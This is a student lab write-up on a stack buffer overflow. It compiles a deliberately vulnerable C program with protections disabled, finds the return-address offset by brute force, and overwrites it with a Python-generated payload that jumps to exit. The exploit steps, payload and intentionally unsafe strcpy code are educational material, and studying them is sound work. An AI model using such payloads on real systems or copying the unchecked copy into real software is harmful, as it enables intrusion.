# Lab3 - Buffer overflow

## Simple buffer overflow example

## What are we going to do?
This example shows that after calling strcpy function, just exit program not returning to the point it was called.
To do that, we need to overwrite the return address of the strcpy function.

## Overview of process 
1. Set a address you want to jump. In this example, we just want to find out the address where the program exit immediately. Later on, this address will be the address you want to execute!!
2. Find where the strcpy return address is.(It's a brute force method)
3. And then, run the c program with a parameter containing the address where you want to jump.(We are going to use the address from the Step1)

## Steps in detail
1. Compile the c program below like this. '-z execstack' marks the stack as executable.
```
gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
```
* gcc option explanation
-g : default debug information
-z execstack : marks the stack as executable
-fno-stack-protector : disables stack protection
-o : set output file name

2. Execute below to find out the address we want to jump. As you can see, 0x080485b3 is the address we want to jump!
```
[02/09/22]seed@VM:Byeongchan$ objdump -D ans_check5 | grep -B 1 exit

08048400 <exit@plt>:
--
 80485b3:	6a 00                	push   $0x0
 80485b5:	e8 46 fe ff ff       	call   8048400 <exit@plt>
[02/09/22]seed@VM:Byeongchan$
```

3. Find out where the return address of strcpy function is! This is where brute force method comes in! Try like below changing the number of print count. If the program ended without printing 'About to exit!', that means return address was corrupted and the program was killed by the system.
```
[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*47")
ans_buf is at address 0xbf88027c
Right answer!
About to exit!
Segmentation fault
[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*48")
ans_buf is at address 0xbf8fe32c
Segmentation fault

```

4. Run like below. Python code will create meaning-less characters followed by exit return address. That return address will overwrite the return address of strcpy. If the program exit without 'Segmentation fault', then you found the right place!!!
```
ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
```

5. Result
* As you can notice, the program exit with special input parameter overwriting the return address 
```
[02/10/22]seed@VM:Byeongchan$ ans_check5
Usage: ans_check5 <answer>
[02/10/22]seed@VM:Byeongchan$ ans_check5 1
ans_buf is at address 0xbf8d9acc
Wrong answer!
About to exit!
[02/10/22]seed@VM:Byeongchan$ ans_check5 forty-two
ans_buf is at address 0xbfb8ad9c
Right answer!
About to exit!
[02/10/22]seed@VM:Byeongchan$ ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
ans_buf is at address 0xbf97bbdc
[02/10/22]seed@VM:Byeongchan$ 
```

# ans_check5.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_answer(char *ans) {

  int ans_flag = 0;
  char ans_buf[32];

  printf("ans_buf is at address %p\n", &ans_buf);

  strcpy(ans_buf, ans);

  if (strcmp(ans_buf, "forty-two") == 0)
    ans_flag = 1;

  return ans_flag;

}

int main(int argc, char *argv[]) {

  if (argc < 2) {
    printf("Usage: %s <answer>\n", argv[0]);
    exit(0);
  }
  if (check_answer(argv[1])) {
    printf("Right answer!\n");
  } else {
    printf("Wrong answer!\n");
  }
  printf("About to exit!\n");
  fflush(stdout);
}
```





```


  
```


